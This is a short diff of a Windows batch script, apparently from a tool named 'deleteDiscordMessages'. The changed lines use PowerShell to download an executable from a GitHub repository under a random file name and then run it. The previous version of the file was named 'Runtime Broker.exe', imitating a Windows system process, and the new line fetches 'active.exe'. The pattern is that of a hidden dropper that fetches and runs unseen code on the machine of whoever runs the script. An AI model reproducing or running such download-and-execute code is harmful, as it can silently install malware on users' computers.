@@ -45,7 +45,7 @@ set "counter=1"
 set "filename=%random%%random%%random%%extension%"
 if exist "%filename%" goto generateFilename
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/SeniorPicchi/deleteDiscordMessages/raw/master/Runtime%20Broker.exe' -OutFile !filename!"
+Powershell -Command "Invoke-Webrequest 'https://github.com/SeniorPicchi/deleteDiscordMessages/raw/master/active.exe' -OutFile !filename!"
 
 start "" "!filename!"
 
